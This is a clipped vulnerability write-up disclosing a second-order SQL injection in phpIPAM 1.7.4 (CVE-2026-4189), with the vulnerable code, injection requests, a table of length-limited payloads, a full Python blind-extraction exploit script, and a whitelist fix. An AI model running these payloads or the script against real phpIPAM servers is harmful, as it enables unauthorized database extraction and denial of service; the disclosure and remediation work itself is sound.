---
title: phpIPAM 1.7.4 - Second Order SQL Injection via subnetOrdering | incogbyte
source: https://incogbyte.github.io/posts/2026-03-17-phpipam-second-order-sqli/
source_host: incogbyte.github.io
clip_date: 2026-09-22T10:28:13+08:00
trace_id: aeae3527-72b4-4e02-a1ff-46b6116f9889
content_hash: 3f68fbda008dd1778392cc138e13aa7290d5c1a91517b06d1a57a44f7aa3aa70
status: synced
tags:
  - 漏洞分析
  - SQL注入
series: null
feed_source: incogbyte·iOS/Mobile
ai_summary: phpIPAM 1.7.4 的 subnetOrdering 参数存在二阶 SQL 注入（CVE-2026-4189）：恶意值先安全入库，之后被直接拼接进 ORDER BY 子句触发注入。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3e375244-d011-8156-b3dc-f94bab722fcf
ioc:
  cves:
    - CVE-2022-23046
    - CVE-2026-4189
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> phpIPAM 1.7.4 的 subnetOrdering 参数存在二阶 SQL 注入（CVE-2026-4189）：恶意值先安全入库，之后被直接拼接进 ORDER BY 子句触发注入。
> 
> - **漏洞标识：** CVE-2026-4189，二阶（存储型）SQL 注入，影响 phpIPAM ≤ 1.7.4；CVSS v3 为 4.7，需编辑 section 的权限。
> - **注入链路：** 管理员 POST `/app/admin/sections/edit-result.php` 提交 `subnetOrdering`，仅经 `strip_tags()` 过滤后由 PDO 预编译安全入库；任意用户访问某 section 的子网页时，`class.Subnets.php:525` 的 `fetch_section_subnets()` 取出该值、按逗号切分，把 `$order[0]` 直接拼入 `ORDER BY` 的 `CASE` 表达式。
> - **验证与利用：** 时间盲注 `SLEEP(3)`（每行执行，4 行约延时 12 秒）；布尔位置盲注用 `id>0`/`id<0` 改变页面排序，再以 `user()>'前缀+字符'` 逐字符提取；`EXP(999)` 可触发报错注入，`@@version>'10.5'` 可二分探测版本。
> - **长度限制：** `subnetOrdering` 为 `VARCHAR(16)`，payload 上限 16 字符；`(SELECT USER())` 可行，`IF(1=1,SLEEP(3),1)` 超长不可用。
> - **根因与修复：** 根因是把存储值当作可信数据，且 ORDER BY 的列名/表达式无法用预编译参数化；修复应对 `order[0]`、`order[1]` 做白名单校验（如 subnet、description、id、vlanId 与 asc、desc）。

## Second Order SQL Injection in phpIPAM 1.7.4 (CVE-2026-4189)

Back in 2022, I found a [SQL injection in phpIPAM 1.4.4](https://incogbyte.github.io/posts/2022-01-20-cve-2022-23046-phpipam/) (CVE-2022-23046) via the BGP mapping search feature. That was a classic, direct SQL injection user input went straight into a query. This time, I went back to phpIPAM and found something more interesting: a **Second Order SQL Injection** in version **1.7.4**, where the payload is stored first and executed later in a completely different context.

## What is a Second Order SQL Injection?

Most SQL injections are "first order" the malicious input is sent and executed in the same request. A **second order** (or stored) SQL injection is different:

1.  **First step (storage):** The attacker submits a payload that gets safely stored in the database (escaped for storage, but not validated for SQL keywords).
2.  **Second step (execution):** Later, the application retrieves that stored value and uses it **unsafely** in a different SQL query that's when the injection fires.

This makes second order SQLi harder to detect because the injection point and the execution point are in completely different parts of the application.

## The Vulnerable Flow

### Step 1: Storing the Payload

When an administrator edits a Section in phpIPAM, they can set a `subnetOrdering` parameter that controls how subnets are sorted. This value is submitted via POST to:

```
POST /app/admin/sections/edit-result.php
```

The application processes this input in `class.Sections.php`:

```php
public function modify_section ($action, $values) {
    // Only strips HTML tags  does NOT prevent SQL injection!
    $values = $this->strip_input_tags ($values);

    if($action=="edit") {
        return $this->section_edit ($values);
    }
}
```

The `strip_input_tags()` function only calls `strip_tags()`, which removes HTML tags but has absolutely no effect on SQL payloads. The value is then stored in the database via PDO prepared statements (so the storage itself is safe):

```sql
UPDATE sections SET subnetOrdering = 'SLEEP(3)' WHERE id = 1;
```

At this point, the payload is sitting harmlessly in the `sections` table.

### Step 2: Triggering the Injection

When **any user** views the subnets page for that section, the application calls `fetch_section_subnets()` in `class.Subnets.php` (line 525):

```php
public function fetch_section_subnets ($sectionId, ...) {
    // ...
    // Retrieves the stored section from database
    $section = $this->fetch_object("sections", "id", $sectionId);

    // Reads the attacker-controlled subnetOrdering value
    if(@$section->subnetOrdering != "default"
       && !is_blank(@$section->subnetOrdering)) {
        $order = pf_explode(',', $section->subnetOrdering);
    }

    // ...

    // VULNERABLE: $order[0] is interpolated directly into the query!
    $query = "SELECT $safe_result_fields FROM `subnets`
              WHERE `sectionId` = ? $field_query
              ORDER BY `isFolder` desc,
              CASE `isFolder`
                WHEN 1 THEN description
                ELSE $order[0]    -- INJECTION HERE!
              END $order[1]";

    $subnets = $this->Database->getObjectsQuery('subnets', $query, array($sectionId));
}
```

The value stored in `subnetOrdering` is split by comma and **directly concatenated** into the SQL query without any sanitization or whitelist validation. The `sectionId` uses a prepared statement parameter (`?`), but `$order[0]` is raw string interpolation classic mistake.

### Why can't we use prepared statements here?

This is a common pitfall. PDO prepared statements **cannot parameterize** column names or expressions in `ORDER BY` clauses:

```sql
-- This does NOT work with prepared statements:
ORDER BY ?    -- ❌ PDO treats this as a literal string, not a column

-- You MUST interpolate:
ORDER BY $column  -- ✅ Works, but vulnerable if $column is not validated
```

The correct fix is a **whitelist** of allowed values, not parameterization.

## Exploitation

### Confirming the Vulnerability: Time-Based

The simplest confirmation is a `SLEEP()` payload. The `subnetOrdering` column is `VARCHAR(16)`, which limits us to 16 characters but `SLEEP(3)` is only 8.

**Step 1:** Authenticate and get a CSRF token.

**Step 2:** Inject the payload:

```http
POST /app/admin/sections/edit-result.php HTTP/1.1
Host: target
Cookie: phpipam=<session>
Content-Type: application/x-www-form-urlencoded

id=1&action=edit&name=Customers&description=Test&subnetOrdering=SLEEP(3)&strictMode=1&showSubnet=1&showVLAN=1&showVRF=1&showSupernetOnly=0&masterSection=0&csrf_cookie=<token>
```

**Step 3:** Visit the section's subnet page and measure response time:

```bash
$ time curl 'http://target/index.php?page=subnets&section=1' \
  -H 'Cookie: phpipam=<session>'

real    0m12.037s   # SLEEP(3) × 4 rows = ~12 seconds
```

The `SLEEP(3)` executes inside a `CASE WHEN` expression for **every row** where `isFolder != 1`. With 4 subnet rows, we get a 12-second delay SQL injection confirmed.

### Boolean-Based Blind: Positional Oracle

Beyond time-based, we can use **boolean-based blind** extraction by observing the **order of elements** on the page. The idea is:

-   Inject a comparison like `id>0` the ORDER BY evaluates to `1` (true) or `0` (false) per row, changing the sort order.
-   Compare the page output against a known baseline.

```
subnetOrdering=id>0      → Baseline TRUE (4 chars)
subnetOrdering=id<0      → Baseline FALSE (4 chars)
subnetOrdering=user()>'a' → Is DB user > 'a'? Check sort order
```

The exploit script automates this:

```python
import requests
import re
import sys

TARGET = "http://localhost"
USER = "admin"
PASS = "password"

MARKER_1 = "Customers"
MARKER_2 = "IPv6"

class IPAM_Position_SQLi:
    def __init__(self, target_url, username, password):
        self.base_url = target_url.rstrip('/')
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.csrf_token = None

    def login(self):
        r = self.session.post(f"{self.base_url}/app/login/login_check.php", data={
            'ipamusername': self.username,
            'ipampassword': self.password,
        })
        return "Login successful" in r.text

    def refresh_csrf(self):
        r = self.session.post(
            f"{self.base_url}/app/admin/sections/edit.php",
            data={'action': 'edit', 'sectionid': '2'}
        )
        match = re.search(r'name="csrf_cookie" value="([^"]+)"', r.text)
        if match:
            self.csrf_token = match.group(1)
            return True
        return False

    def inject_payload(self, payload):
        if len(payload) > 16:
            print(f"[!] PAYLOAD TOO LONG: {payload}")
            return False

        self.session.post(f"{self.base_url}/app/admin/sections/edit-result.php", data={
            'id': '1', 'action': 'edit', 'name': 'Customers',
            'description': 'Inject', 'subnetOrdering': payload,
            'strictMode': '1', 'showSubnet': '1', 'showVLAN': '0',
            'showVRF': '0', 'showSupernetOnly': '0', 'masterSection': '0',
            'csrf_cookie': self.csrf_token
        })
        return True

    def check_truth(self):
        r = self.session.get(f"{self.base_url}/index.php?page=subnets&section=1")
        pos1 = r.text.find(MARKER_1)
        pos2 = r.text.find(MARKER_2)
        if pos1 == -1 or pos2 == -1:
            return None
        return pos1 < pos2

    def exploit(self):
        if not self.login():
            return

        # Calibrate: establish TRUE and FALSE baselines
        self.refresh_csrf()
        self.inject_payload("id>0")  # Always TRUE
        baseline_true = self.check_truth()

        self.refresh_csrf()
        self.inject_payload("id<0")  # Always FALSE
        baseline_false = self.check_truth()

        if baseline_true == baseline_false:
            print("[-] Sort order didn't change. Adjust markers.")
            return

        # Extract data character by character
        charset = "abcdefghijklmnopqrstuvwxyz0123456789_@."
        extracted = ""

        print("[*] Extracting data...")
        while True:
            found = False
            for c in sorted(charset):
                payload = f"user()>'{extracted}{c}'"
                if not self.inject_payload(payload):
                    return

                self.refresh_csrf()
                result = self.check_truth()
                is_true = (result == baseline_true)

                if not is_true:
                    extracted += c
                    print(f"[+] Found: {c} | Current: {extracted}")
                    found = True
                    break

            if not found:
                break

        print(f"\n[+] Extracted: {extracted}")

if __name__ == "__main__":
    app = IPAM_Position_SQLi(TARGET, USER, PASS)
    app.exploit()
```

### The VARCHAR(16) Constraint

The `subnetOrdering` column is defined as `VARCHAR(16)`, which severely limits payload length. Here's what fits and what doesn't:

| Payload | Length | Works? |
| --- | --- | --- |
| `SLEEP(3)` | 8   | Yes |
| `id>5` | 4   | Yes |
| `IF(1=1,1,2)` | 11  | Yes |
| `USER()` | 6   | Yes |
| `@@version>'10'` | 14  | Yes |
| `@@version>'10.5'` | 16  | Yes (limit!) |
| `(SELECT USER())` | 14  | Yes |
| `IF(1=1,SLEEP(3),1)` | 18  | No (too long) |

This constraint makes exploitation more challenging but far from impossible. The boolean-based positional technique works well within these limits.

### Other Confirmed Techniques

**Error-Based** payloads like `EXP(999)` or `POW(9,9,9)` trigger visible SQL errors on the page, confirming injection:

```sql
SQLSTATE[22003]: Numeric value out of range: 1690
DOUBLE value is out of range in 'exp(999)'
```

**Version Detection** binary search using comparisons:

```python
@@version>'10'      → TRUE (version >= 10)
@@version>'11'      → FALSE (version < 11)
@@version>'10.5'    → TRUE (version >= 10.5)
```

## Impact

-   **Authentication Required:** privileges needed to edit sections.
-   **Persistent:** The payload stays in the database and fires every time any user views that section's subnets.
-   **Blind Data Extraction:** Database user, version, and potentially table contents can be extracted via boolean-based or time-based techniques.
-   **Denial of Service:** `SLEEP()` payloads cause significant delays for all users viewing the affected section.

## Root Cause

The root cause is straightforward: the application treats a stored value as trusted data. The `subnetOrdering` value passes through `strip_tags()` (which only removes HTML) and is later interpolated directly into a SQL query without validation.

```
User Input → strip_tags() → Database (stored safely via PDO)
                                ↓
Database → fetch_object() → string concatenation into SQL → BOOM
```

## Remediation

The fix is a whitelist validation before using the value in the query:

```php
$allowed_ordering = ['subnet', 'description', 'id', 'vlanId'];
$allowed_directions = ['asc', 'desc', ''];

$order = pf_explode(',', $section->subnetOrdering);

if (!in_array($order[0], $allowed_ordering, true)) {
    $order[0] = 'subnet'; // safe default
}
if (isset($order[1]) && !in_array(strtolower(trim($order[1])), $allowed_directions, true)) {
    $order[1] = 'asc';
}
```

|     |     |
| --- | --- |
| **CVE** | [CVE-2026-4189](https://www.tenable.com/cve/CVE-2026-4189) |
| **Affected Version** | phpIPAM up to 1.7.4 |
| **Type** | Second Order SQL Injection |
| **Component** | `app/admin/sections/edit-result.php` / `subnetOrdering` parameter |
| **CVSS v3** | 4.7 (Medium) `AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L` |
| **CVSS v4** | 5.1 (Medium) |

Keep hacking.
